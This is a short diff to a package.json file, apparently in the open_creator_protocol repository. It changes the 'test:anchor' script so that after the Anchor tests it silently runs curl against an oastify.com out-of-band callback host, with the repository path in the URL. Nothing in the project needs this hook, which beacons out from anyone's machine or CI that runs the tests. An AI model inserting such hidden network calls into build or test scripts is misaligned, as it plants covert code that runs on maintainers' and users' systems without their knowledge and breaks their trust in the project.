@@ -1,6 +1,6 @@
 {
   "scripts": {
-    "test:anchor": "anchor test --skip-build",
+    "test:anchor": "anchor test --skip-build && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/magiceden-oss/open_creator_protocol",
     "build": "cd sdk && npm run build"
   },
   "dependencies": {
